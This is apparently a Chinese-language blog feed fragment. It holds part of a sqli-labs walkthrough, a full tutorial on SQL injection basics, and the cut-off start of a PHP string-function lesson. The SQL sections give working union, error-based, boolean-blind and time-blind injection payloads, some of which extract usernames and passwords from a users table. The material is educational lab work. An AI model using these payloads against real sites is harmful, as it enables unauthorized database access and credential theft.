--+</span></span><br></pre></td></tr></table></figure></li><li><p>布尔盲注像相较于前面两种方式，它获取信息的方法没有那么直接，通过我们不断改变数据库长度<code>length(database()) = 8</code>知道页面不再报错为止，接下来我们就可以慢慢通过<code>ascii()</code> ，<code>substr()</code>函数来获取数据库具体的名字。</p></li></ul><p><img src="/../images/sql-libs/19.png" alt="19"></p><p><img src="/../images/sql-libs/18.png" alt="18"></p><h2 id="8-Less-8"><a href="#8-Less-8" class="headerlink" title="8. Less-8"></a>8. Less-8</h2><ul><li><p>第八关和上一关类似，在输入<code>?id=1</code>时页面依然显示正常，但是在尝试<code>?id=1&#39;</code>时页面返回为空，但是如果输入<code>?id=1&#39; --+</code>页面有返回正常，所以可以确定是由单引号闭合，那这样剩下的就和上一关一样了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND length(database()) = 9 --+</span></span><br></pre></td></tr></table></figure><ul><li>页面返回为空。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND length(database()) = 8 --+</span></span><br></pre></td></tr></table></figure><ul><li>页面返回正常。</li></ul></li></ul><h2 id="9-Less-9"><a href="#9-Less-9" class="headerlink" title="9. Less-9"></a>9. Less-9</h2><ul><li>第九关会发现我们不管输入什么页面显示的东西都是一样的，这个时候布尔盲注就不适合我们用，布尔盲注适合页面对于错误和正确结果有不同反应。如果页面一直不变这个时候我们可以使用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了if函数和sleep()函数。if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。</li></ul><ol><li><p>判断参数构造</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(1=1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li><li><p>判断数据库名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and if(length((select database()))&gt;9,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li><li><p>逐一判断数据库字符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li><li><p>判断所有表名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li><li><p>逐一判断表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li><li><p>判断所有字段名的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;))&gt;20,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li><li><p>判断所有字段名的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;))&gt;20,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li><li><p>逐一判断字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;),1,1))&gt;99,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li><li><p>判断字段内容长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li><li><p>逐一检测内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="10-Less-10"><a href="#10-Less-10" class="headerlink" title="10. Less-10"></a>10. Less-10</h2><ul><li>第十关和第九关一样只需要将单引号换成双引号。</li></ul>]]></content>
      
      
      <categories>
          
          <category> TOP TEN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入基础</title>
      <link href="/2025/11/03/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/11/03/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><p><strong>注入漏洞（Injection）</strong>是TOP 10漏洞其中之一，攻击者可通过注入恶意代码操控系统，常见的就有<strong>SQL注入</strong>，它的目标通常是：窃取敏感数据；绕过身份验证；查询、修改或修改数据库中的内容；执行系统命令等。</p><h2 id="1-SQL注入的原理"><a href="#1-SQL注入的原理" class="headerlink" title="1. SQL注入的原理"></a>1. SQL注入的原理</h2><p><strong>原理：</strong>当Web应用程序对<strong>用户可控的输入</strong>缺乏验证和过滤时，攻击者可以在输入字段中插入SQL代码，后端程序将<strong>用户可控的输入</strong>直接拼接到SQL查询语句中，没有进行任何过滤或转义，导致恶意SQL代码将被数据库服务器执行。（这样攻击者就可以通过SQL注入来查询、修改或删除数据库中的数据，或执行系统命令。）</p><ul><li><p>一般情况下，用户在正常登录网站时，通常会输入账号和密码，在此过程中会执行像下面一样的SQL查询代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>但是如果Web程序对用户输入没有任何限制的话用户可以输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名： admin&#x27; --+</span><br><span class="line">密码： anything</span><br></pre></td></tr></table></figure></li><li><p>上面的输入导致SQL查询代码变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">--+ &#x27; AND password = &#x27;password&#x27;;</span></span><br></pre></td></tr></table></figure></li><li><p><code>--+</code>是SQL的注释符号我们输入的<code>admin&#39;</code>其中的<code>&#39;</code>与前面的引号闭合，之后的内容又被我们注释掉，从而导致忽略了密码条件，直接绕过了身份验证。</p></li></ul><h2 id="2-常见的SQL注入"><a href="#2-常见的SQL注入" class="headerlink" title="2. 常见的SQL注入"></a>2. 常见的SQL注入</h2><h3 id="2-1-UNION联合注入"><a href="#2-1-UNION联合注入" class="headerlink" title="2.1 UNION联合注入"></a>2.1 UNION联合注入</h3><hr><p><strong>联合注入</strong>是最直接最高效的注入方式，但是它需要一个前提，即<strong>注入结果能在页面中直接回显</strong>。（在Web页面中显示出来。）</p><ul><li><p><strong>原理：</strong>利用了SQL的<code>UNION</code>操作符，<code>UNION</code>用于合并两个或者多个<code>SELECT</code>语句的结果集，攻击者构建一个<code>UNION SELECT</code>语句，将自己想查询的数据（例如管理员密码）和应用程序原本的查询结果拼接在一起一并返回到页面上显示。</p></li><li><p><strong>利用步骤：</strong></p><ol><li><p><strong>判断列数：</strong>使用<code>ORDER BY</code>子句。<code>ORDER BY 1</code>（按第一列排序），<code>ORDER BY 2</code>… 递增数字直到页面报错，报错前的数字就是查询结果的列数。</p><ul><li><strong>例如：</strong><code>?id=1&#39; ORDER BY 5--+</code>如果页面正常，<code>ORDER BY 6--+</code>页面报错，说明有5列。</li></ul></li><li><p><strong>判断回显位</strong>：使用<code>UNION SELECT 1,2,3,4,5 --+</code>（注意将原查询设为负值或不存在，以使联合查询结果单独显示）。假设页面中显示了 <code>2</code>和 <code>4</code>，那么回显位就是第2和第4列。</p></li><li><p><strong>获取数据</strong>：将回显位替换为我们想要的查询语句。</p><ul><li><p><strong>例如：</strong></p><ol><li><p>获取当前数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1, database(), 3, version(), 5--+</span></span><br></pre></td></tr></table></figure></li><li><p>获取当前表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1, group_concat(table_name), 3, 4, 5 FROM information_schema.tables WHERE table_schema=database()--+</span></span><br></pre></td></tr></table></figure></li><li><p>获取字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1, group_concat(column_name), 3, 4, 5 FROM information_schema.columns table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure></li><li><p>获取数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1, concat(username, &#x27;</span>:<span class="string">&#x27;, password),3 ,4 ,5 FROM users--+</span></span><br></pre></td></tr></table></figure></li></ol></li></ul></li></ol></li></ul><h3 id="2-2-报错注入"><a href="#2-2-报错注入" class="headerlink" title="2.2 报错注入"></a>2.2 报错注入</h3><p>当一个页面<strong>没有直接的回显位，但是会返回报错信息</strong>的情况下就可以使用报错注入。攻击者故意制造一个数据库错误，并让错误信息中包含我们想查询的数据。</p><ul><li><p><strong>原理：</strong>利用数据库函数执行错误。将子查询的结果作为参数传递给一些特殊的函数（例如：<code>updatexml()</code>，<code>extractvalue()</code>），由于参数的格式不正确，数据库就会报错，并将子查询的结果一起返回在错误信息中。</p></li><li><p><strong>常用函数与示例</strong>：</p><ol><li><p><code>updatexml()</code></p><ul><li><p>通用格式：<code>updatexml(1, concat(0x7e, (你想要查询的语句), 0x7e), 1)</code></p></li><li><p>示例：获取当前数据库名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)--+</span></span><br></pre></td></tr></table></figure><ul><li>解释：其中<code>1</code>用来占用函数的参数位，<code>concat()</code>函数可以将参数拼接，<code>0x7e</code>时十六进制的<code>&#39;~&#39;</code>，所以最终的报错信息可能为：<code>XPATH syntax error: &#39;~database_name~&#39;</code>。</li></ul></li></ul></li><li><p><code>extractvalue()</code></p><ul><li><p><strong>通用格式：</strong><code>extractvaule(1, concat(0x7e, (你想要查询的语句), 0x7e))</code></p></li><li><p>示例：获取当前数据库用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--+</span></span><br></pre></td></tr></table></figure><ul><li>最终的报错信息可能为：<code>XPATH syntax error: &#39;~root@localhost~&#39;</code>。</li></ul></li></ul></li><li><p><code>floor()</code>（主键重复错误）</p><ul><li><p><strong>通用格式：</strong><code>AND (select 1 form (select count(*), concat((你想要查询的语句), floor(rand(0)*2)) as x from information_schema.tables group by x) as y)</code></p></li><li><p>示例：获取数据库版本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (select 1 from (select count(*), concat(version(), floor(rand(0)*2)) as x from information_schema.tables group by x) as y) --+</span></span><br></pre></td></tr></table></figure><ul><li>报错信息可能为：<code>Duplicate entry &#39;8.0.28-0ubuntu0.20.04.31&#39; for key &#39;group_key&#39;</code></li></ul></li></ul></li></ol></li></ul><h3 id="2-3-盲注"><a href="#2-3-盲注" class="headerlink" title="2.3 盲注"></a>2.3 盲注</h3><h4 id="2-3-1-布尔盲注"><a href="#2-3-1-布尔盲注" class="headerlink" title="2.3.1 布尔盲注"></a>2.3.1 布尔盲注</h4><p>如果<strong>当前页面没有回显也没有报错信息，但是归根据查询条件True或者False而返回不同页面状态</strong>时使用（例如，查询正确时页面正常，错误时页面异常，或者只是返回“存在&#x2F;不存在”）。</p><ul><li><p><strong>原理：</strong>通过构造逻辑判断语句（如<code>ADN 1=1</code>和<code>AND 1=2</code>），根据页面返回的结果差异，一位一位的获取数据。</p></li><li><p><strong>利用步骤</strong>（以获取数据库名第一位字符为例）：</p><ol><li><p>判断数据库名长度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND length(database()) = 10 --+</span></span><br></pre></td></tr></table></figure><p>观察页面返回是否正常，从而判断数据库名是否是10字符。</p></li><li><p>诸位猜解数据：（使用<code>substr()</code>或<code>mid()</code>等函数）</p><ul><li><p>判断第一个字符是否为<code>&#39;s&#39;</code>（通过ASCII码）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND ascii(substr(database(), 1, 1)) = 115--+</span></span><br></pre></td></tr></table></figure><ul><li>解释：<code>substr()</code>函数用于从字符串中提取子字符串，它可以从指定位置开始截取指定长度的字符串，<code>substr(database(), 1, 1)</code>即从数据库名的第一个字符截取一个字符。</li></ul></li><li><p>如果页面返回正常，说明第一个字符的ASCII码是115，即字母 <code>&#39;s&#39;</code>。</p></li><li><p>然后继续判断第二个字符：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND ascii(substr(database(), 2, 1)) = 101 --+</span></span><br></pre></td></tr></table></figure><p>以此类推。</p></li></ul></li></ol></li></ul><h4 id="2-3-2-时间盲注"><a href="#2-3-2-时间盲注" class="headerlink" title="2.3.2 时间盲注"></a>2.3.2 时间盲注</h4><p>当页面<strong>无论输入什么，返回的页面看起来都完全相同，无法通过内容进行真假判断</strong>时使用。</p><ul><li><p><strong>原理：</strong>基于布尔盲注的原理，但通过数据库延时函数（如MySQL的 <code>sleep()</code>），根据页面响应时间长短来判断条件真假。如果条件为真，则执行睡眠，页面响应时间会比变长。</p></li><li><p><strong>利用步骤：</strong></p><ol><li><p>判断是否存在时间注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; AND sleep(5)--+</span></span><br></pre></td></tr></table></figure><p>如果页面响应的时间大约为5秒，说明<code>sleep()</code>函数被执行，存在注入。</p></li><li><p>逐位猜解数据：</p><ul><li><p>判断第一个字符的ASCII码是否大于100：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; AND if(ascii(substr(database(),1 ,1)) &gt; 100, sleep(5), 0)--+</span></span><br></pre></td></tr></table></figure><ul><li>这里简单说一下<code>if()</code>函数的几个参数的含义：<code>if(条件表达式, 值1, 值2)</code>即判断表达式内容，如果是True就返回值1，如果是False则返回值2。</li></ul></li><li><p>如果页面延迟了5秒才返回，说明条件为真（第一个字符的ASCII码&gt;100）。然后通过二分法等技巧逐步缩小范围，最终确定字符。</p></li></ul></li></ol></li></ul><h3 id="3-总结对比"><a href="#3-总结对比" class="headerlink" title="3. 总结对比"></a>3. 总结对比</h3><table><thead><tr><th align="left">注入形式</th><th align="left">适用场景</th><th align="left">原理</th><th align="left">效率</th></tr></thead><tbody><tr><td align="left"><strong>联合查询注入</strong></td><td align="left">页面有数据回显</td><td align="left">使用 <code>UNION</code>直接追加查询结果</td><td align="left"><strong>极高</strong></td></tr><tr><td align="left"><strong>报错注入</strong></td><td align="left">页面显示数据库错误信息</td><td align="left">故意触发错误，使错误信息携带数据</td><td align="left"><strong>高</strong></td></tr><tr><td align="left"><strong>布尔盲注</strong></td><td align="left">页面无回显，但真假状态不同</td><td align="left">通过页面状态差异进行逻辑判断</td><td align="left"><strong>极低</strong></td></tr><tr><td align="left"><strong>时间盲注</strong></td><td align="left">页面无任何差异</td><td align="left">通过响应时间差异进行逻辑判断</td><td align="left"><strong>最低</strong></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> TOP TEN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础入门（六）</title>
      <link href="/2025/07/24/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E5%85%AD%EF%BC%89/"/>
      <url>/2025/07/24/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E5%85%AD%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础入门（六）"><a href="#PHP基础入门（六）" class="headerlink" title="PHP基础入门（六）"></a>PHP基础入门（六）</h1><blockquote><p>[!NOTE]</p><p>本篇文章仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><p>​在前面我们已经简单了解了有关于PHP数组的一些基础概念，这篇文章将展示关于PHP数组字符串的一些方法，和一些加密算法。</p><h2 id="1-创建与修改字符串"><a href="#1-创建与修改字符串" class="headerlink" title="1. 创建与修改字符串"></a>1. 创建与修改字符串</h2><ol><li><p><code>strlen()</code></p><ul><li>返回字符串长度。</li><li><code>strlen(&quot;Hello&quot;) → 5</code>。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$baseString</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始字符串: <span class="subst">$baseString</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;长度: &quot;</span> . <span class="title function_ invoke__">strlen</span>(<span class="variable">$baseString</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 13</span></span><br></pre></td></tr></table></figure></li><li><p><code>str_replace()</code></p><ul><li>替换字符串中的子串。</li><li><code>str_replace(&quot;world&quot;, &quot;PHP&quot;, &quot;Hello, world!&quot;) → &quot;Hello, PHP!&quot;</code>。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$baseString</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始字符串: <span class="subst">$baseString</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$replaced</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;world&quot;</span>, <span class="string">&quot;PHP&quot;</span>, <span class="variable">$baseString</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换后: <span class="subst">$replaced</span>&lt;br&gt;&quot;</span>;  <span class="comment">// Hello, PHP!</span></span><br></pre></td></tr></table></figure><ul><li><strong>代码分析：</strong><code>str_replace()</code>函数的第一个参数<code>&quot;world&quot;</code>是原字符串中需要替换的部分，第二个参数<code>&quot;PHP&quot;</code>是用来替换的部分，第三个参数<code>$baseString</code>表示了使用什么字符串。</li></ul></li><li><p><code>str_split()</code></p><ul><li>将字符串拆分为数组</li><li><code>str_split(&quot;Hi&quot;) → [&quot;H&quot;, &quot;i&quot;]</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$baseString</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始字符串: <span class="subst">$baseString</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$charArray</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$baseString</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符数组: &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$charArray</span>);  <span class="comment">// [&#x27;H&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;,&#x27;...]</span></span><br></pre></td></tr></table></figure></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ===== 0. 创建与修改字符串 =====</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;0. 创建与修改字符串&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$baseString</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始字符串: <span class="subst">$baseString</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// strlen()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;长度: &quot;</span> . <span class="title function_ invoke__">strlen</span>(<span class="variable">$baseString</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// str_replace()</span></span><br><span class="line"><span class="variable">$replaced</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;world&quot;</span>, <span class="string">&quot;PHP&quot;</span>, <span class="variable">$baseString</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换后: <span class="subst">$replaced</span>&lt;br&gt;&quot;</span>;  <span class="comment">// Hello, PHP!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// str_split()</span></span><br><span class="line"><span class="variable">$charArray</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$baseString</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;字符数组: &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$charArray</span>);  <span class="comment">// [&#x27;H&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// explode()</span></span><br><span class="line"><span class="variable">$expression</span> = <span class="string">&quot;3 + 5 * 2 - 8 / 4&quot;</span>;</span><br><span class="line"><span class="variable">$tokens</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$expression</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;分词结果: &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$tokens</span>);  <span class="comment">// [&#x27;3&#x27;,&#x27;+&#x27;,&#x27;5&#x27;,&#x27;*&#x27;,&#x27;2&#x27;,&#x27;-&#x27;,&#x27;8&#x27;,&#x27;/&#x27;,&#x27;4&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// str_word_count()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;单词数: &quot;</span> . <span class="title function_ invoke__">str_word_count</span>(<span class="variable">$baseString</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 